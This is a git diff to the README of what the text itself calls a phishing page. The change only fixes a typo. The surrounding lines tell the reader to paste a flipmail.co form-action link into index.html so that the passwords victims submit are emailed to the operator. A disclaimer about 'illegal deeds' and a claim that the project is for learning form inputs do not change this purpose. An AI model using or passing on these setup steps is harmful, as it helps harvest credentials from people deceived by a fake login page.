@@ -9,6 +9,6 @@ Feel free to make to changes in my code.<br>
 * go to flipmail.com and enter your email to get a link.
 * copy that link and edit the following line of code in index.html<br>
 ``` <form method="POST" action="http://flipmail.co/api/6PTILki4KnRoNyG4U2rg"> ```
-* paste your flipmail link in action field and it will start sedning responses to your email address.
+* paste your flipmail link in action field and it will start sending responses to your email address.
 * I am not responsible for any illegal deeds done by you after getting password through this phishing page.
 * I created this for the purpose of learning form inputs.
